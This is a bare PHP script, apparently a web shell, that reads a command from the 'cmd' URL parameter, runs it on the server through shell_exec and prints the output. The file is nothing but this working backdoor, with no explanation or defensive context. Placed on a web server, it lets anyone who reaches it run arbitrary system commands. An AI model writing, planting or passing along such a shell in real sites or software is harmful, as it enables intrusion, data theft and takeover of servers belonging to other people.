<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
